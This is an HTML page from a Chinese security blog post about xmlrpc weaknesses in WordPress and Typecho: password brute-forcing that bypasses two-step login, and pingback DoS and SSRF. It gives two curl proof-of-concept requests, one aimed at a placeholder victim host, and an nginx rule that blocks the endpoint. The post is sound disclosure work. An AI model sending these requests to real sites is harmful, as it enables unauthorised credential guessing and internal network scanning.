@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>WordPress和Typecho xmlrpc漏洞 - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="WordPress和Typecho xmlrpc漏洞 - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/733/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            
+        </div>
+        <h1>WordPress和Typecho xmlrpc漏洞</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2016-04-20 21:12"><i class="iconfont icon-date"></i>2016-04-20 21:12</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <p>一般大家都关注WordPress，毕竟用户量巨大，而国内的Typecho作为轻量级的博客系统就关注的人并不多。Typecho有很多借鉴WordPress的，包括兼容的xmlrpc接口，而WordPress的这个接口爆出过多个漏洞，Typecho无一幸免。</p>
+
+<h2 id="账号密码爆破">账号密码爆破</h2>
+
+<p>WordPress的相关漏洞可以参考 https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/ 这个漏洞在Typecho上要危害稍微小一点，因为WordPress是有破解保护的，而这个接口可以绕过这个保护，Typecho并没有这个保护，只要暴露了后台地址就然并卵了。但是我采用了后台登录的两步验证，这个接口接口确实绕过了两步验证。</p>
+
+<p>POC</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code>curl <span class="s2">"https://example.com/action/xmlrpc"</span> -d <span class="s1">'&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;{USERNAME}&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;{PASSWORD}&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;'</span>
+</code></pre>
+</div>
+
+<h2 id="ping-back造成的dos和ssrf">Ping back造成的dos和SSRF</h2>
+
+<p>WordPress会尝试去访问Ping back的url，可能会造成dos问题。参考http://www.acunetix.com/blog/articles/wordpress-pingback-vulnerability/</p>
+
+<p>同时，没有对url进行校验，可以用来扫描内网。</p>
+
+<p>WordPress后来修补了SSRF的问题，后来被绕过，前几天刚刚重新修复，见 http://xlab.baidu.com/wordpress/。但是Typecho没有任何过滤。</p>
+
+<p>POC</p>
+
+<div class="language-shell highlighter-rouge"><pre class="highlight"><code>curl <span class="s2">"https://example.com/action/xmlrpc"</span> -d <span class="s1">'&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://victim.com&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;https://example.com/index.php/archives/732/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;'</span>
+</code></pre>
+</div>
+
+<p>看到了xml，还顺手测试了一把xxe，不过暂时没有发现这个问题。解析xml时候的本地拒绝服务是存在的，Inutio XML-RPC Library的问题，有两个CVE。</p>
+
+<h2 id="解决方案">解决方案</h2>
+
+<p>nginx屏蔽此url</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>if ($uri ~ ^/index.php/action/xmlrpc) {
+    return 403;
+}
+</code></pre>
+</div>
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=WordPress和Typecho xmlrpc漏洞&article_id=/index.php/archives/733/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
